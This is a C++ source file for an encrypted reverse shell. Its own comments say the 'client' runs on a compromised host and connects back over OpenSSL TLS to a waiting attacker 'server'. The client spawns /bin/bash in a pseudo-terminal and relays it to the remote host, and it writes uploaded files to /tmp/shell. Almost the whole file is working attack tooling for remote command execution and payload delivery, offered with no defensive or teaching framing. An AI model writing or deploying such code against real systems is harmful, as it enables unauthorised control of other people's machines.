#include "utils.h"
#include "args_parser.h"

// error msgs
std::string pipeFailed = "[!] Pipe creation failed!";
std::string forkFailed = "[!] Fork creation failed!";
std::string execlFailed = "[!] Execl failed!";
std::string failedToOpenClientSoc = "[!] Failed to create client socket!";
std::string serverDisconnected = "[!] Server Disconnected!";
std::string failedToAcceptClient = "[!] Failed to accept incoming connection!";

SSL_CTX* createSSLCtx() {
    // https://docs.openssl.org/master/man3/SSL_CTX_new/#synopsis
    const SSL_METHOD *method = TLS_method(); // setting cipher/algorithm to be used (in this case the server ssl)
    SSL_CTX* ctx = SSL_CTX_new(method);

    if (!ctx) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

void configureServerCtx(SSL_CTX* ctx) {
    // load the cert and private key
    if (SSL_CTX_use_certificate_file(ctx, "server.crt", SSL_FILETYPE_PEM) <= 0
        || SSL_CTX_use_PrivateKey_file(ctx, "server.key", SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
}

void server(const std::string &serverIpAddr, unsigned int portNum) {
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (serverSocket < 0) {
        std::cout << "Failed to create server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET; // define IPV4
    serverAddr.sin_port = htons(portNum); // set port, htons coverts port to byte order
    serverAddr.sin_addr.s_addr = inet_addr(serverIpAddr.c_str()); // listen on any available IP (allow further config?)

    // check bind is okay
    if (bind(serverSocket, reinterpret_cast<struct sockaddr *>(&serverAddr), sizeof(serverAddr)) < 0) {
        std::cout << "Failed to bind server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    // check we can listen on bind
    if (listen(serverSocket, 5) < 0) {
        std::cout << "Failed to listen on server socket!" << std::endl;
        exit(EXIT_FAILURE);
    }

    std::cout << "[+] Server listening on " << serverIpAddr << ":" << portNum << std::endl;

    // get info on connecting client
    struct sockaddr_storage clientAddr;
    socklen_t clientAddrLen = sizeof(clientAddr);
    char clientIpAddr[INET_ADDRSTRLEN];

    OPENSSL_init_ssl(0, NULL);

    int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);

    // get some info for server user
    struct sockaddr_in *s = (struct sockaddr_in *)&clientAddr;
    int clientPort = ntohs(s->sin_port); // converts byte to port number
    inet_ntop(AF_INET, &s->sin_addr, clientIpAddr, sizeof clientIpAddr); // get readable ipv4 addr
    std::cout << "[+] Connection Received from: " << clientIpAddr << " On Port: " << clientPort << std::endl;

    SSL_CTX* ctx = createSSLCtx();
    configureServerCtx(ctx);

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, clientSocket);

    if (SSL_accept(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        std::cout << "[+] TLS handshake successful!\n" << std::endl;
    }

    // check we were able to accept connection from client
    if (clientSocket < 0) {
        safeShutdown(failedToAcceptClient, serverSocket, clientSocket, ssl, ctx);
    }

    fd_set fdSet;
    char ttyBuffer[4096];
    while (true) {
        // setting up select() func
        FD_ZERO(&fdSet);
        FD_SET(clientSocket, &fdSet); // data from client
        FD_SET(STDIN_FILENO, &fdSet); // data from stdin

        int maxFd = std::max(clientSocket, STDIN_FILENO) + 1;
        // see if we are getting any data from the client or from our own stdin
        int activity = select(maxFd, &fdSet, nullptr, nullptr, nullptr);

        if (activity < 0 ) {
            break;
        }

        // Data from client -> server
        if (FD_ISSET(clientSocket, &fdSet)) {
            // read incoming data
            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
            // if no data, client has disconnected and we can exit
            if (bytesReceived <= 0) {
                std::cout << "[!] Client disconnected" << std::endl;
                break;
            }
            // print output from client
            std::cout.write(ttyBuffer, bytesReceived);
            std::cout.flush();
        }

        // Data from input -> to then send to client
        if (FD_ISSET(STDIN_FILENO, &fdSet)) {
            // read input
            ssize_t input = read(STDIN_FILENO, ttyBuffer, sizeof(ttyBuffer));

            if (input > 0) {
                // if input is 'exit' we know we want to quit
                std::string inputCmd(ttyBuffer, input);
                if (inputCmd.find("exit") != std::string::npos) {
                    // execute shutdown
                    safeShutdown("[!] Exit has been executed, exiting...", clientSocket, serverSocket, ssl, ctx);
                }
                else if (inputCmd.find("upload") != std::string::npos) {

                    std::vector<std::byte> fileBuffer = readFileAsByteVector(parseUploadCommand(ttyBuffer));

                    prepareAndSendFile(ssl, fileBuffer, "upload");

                }
                else if (inputCmd.find("download") != std::string::npos) {
                    // send download to client with file path intending to download
                    // client reads as bytes, prepares and sends, we handle incoming here
                }
                else {
                    // if not 'exit' send to client
                    SSL_write(ssl, ttyBuffer, input);
                }

            }
        }
    }

    SSL_free(ssl);
    SSL_CTX_free(ctx);

    close(clientSocket);
    close(serverSocket);
}


void client(const std::string &ipAddr, unsigned int portNum) {

    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (clientSocket < 0) {
        std::cout << "Failed to create client socket!" << std::endl;
        exit(1);
    }

    // socket info
    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(portNum);
    serverAddr.sin_addr.s_addr = inet_addr(ipAddr.c_str());
    char socket_buffer[1024];

    if (connect(clientSocket, reinterpret_cast<struct sockaddr *>(&serverAddr),sizeof(serverAddr)) < 0) {
        std::cout << "Failed to connect to server!" << std::endl;
        close(clientSocket);
        exit(-1);
    }

    // as of openssl 1.1.0, openssl can allocate all resources required (error strings, etc)
    OPENSSL_init_ssl(0, NULL);

    SSL_CTX* ctx = createSSLCtx();
    SSL* ssl = SSL_new(ctx);
    //https://docs.openssl.org/master/man3/SSL_set_fd/
    // "bind" to socket, or set ssl fd to socket input/output
    SSL_set_fd(ssl, clientSocket);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    }
    else {
        std::cout << "[+] Connected to server with TLS!" << std::endl;
    }

    int masterFd;
    pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);

    if (childPid < 0) {
        safeShutdown(forkFailed, clientSocket, masterFd, ssl, ctx);
    }
    if (childPid == 0) {
        execl("/bin/bash", "bash", nullptr);
        safeShutdown(execlFailed, clientSocket, masterFd, ssl, ctx);
    }

    fd_set fds;
    char ttyBuffer[4096];
    while (true) {
        FD_ZERO(&fds);
        FD_SET(clientSocket, &fds);
        FD_SET(masterFd, &fds);

        int maxFd = std::max(clientSocket, masterFd) + 1;
        int activity = select(maxFd, &fds, nullptr, nullptr, nullptr);
        if (activity < 0 ) {
            break;
        }

        // from server to tty
        if (FD_ISSET(clientSocket, &fds)) {
            ssize_t bytesReceived = SSL_read(ssl, ttyBuffer, sizeof(ttyBuffer));
            if (bytesReceived <= 0) {
                std::cout << serverDisconnected << std::endl;
                break;
            }

            // server has requested an upload, so we dont send the data coming in to
            // the masterfD, infact we upload the file to the server
            // we should be expecting a second incoming connection ..
            std::string tmpStr(ttyBuffer, bytesReceived);
            if (tmpStr.find("upload")  != std::string::npos) {

                std::vector<std::byte> incomingFile = handleIncomingFile(ssl, "upload");
                if (!incomingFile.empty()) {
                    writeBytesToFile(incomingFile, "/tmp/shell");
                }
                else {
                    std::cout << "[!] An error occured in transmission!" << std::endl;
                }

            }else {
                // ssl not required here as were just writing to local shell
                write(masterFd, ttyBuffer, bytesReceived);
            }

        }

        // from tty to server
        if (FD_ISSET(masterFd, &fds)) {
            // read input from local chell
            ssize_t n = read(masterFd, ttyBuffer, sizeof(ttyBuffer));
            // check we actually have some data
            if (n > 0) {
                // use ssl to send it to the server
                SSL_write(ssl, ttyBuffer, n);
            }
        }
    }

    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(clientSocket);
    close(masterFd);
    wait(nullptr);
}


int main(const int argc, char *argv[]) {

    /*  Program Layout
     *  User passes argument 'client' or 'server'
     *  'client' would be a compromised host attempting to connect back to attacker
     *  'server' would be an attacker waiting for a connection
     *
     *  if 'server' arg passed, we pass the IP address and port to listen on
     *
     *  if 'client' arg passed, we need the IPv4 addr and PORT number of the listening 'server'
     *
     *  then connect and set up an encrypted rev shell (using OpenSSL TLS, Typically 1.2)
     */
    struct config cfg = parse_args(argc, argv);

    // check if parser worked
    if (cfg.execType.empty() || cfg.portNum == NULL || cfg.ipAddr.empty()) {
        exit(-1);
    }

    if (cfg.execType == "server") {
        server(cfg.ipAddr, cfg.portNum);
    }
    else {
        client(cfg.ipAddr, cfg.portNum);
    }

    return 0;
}

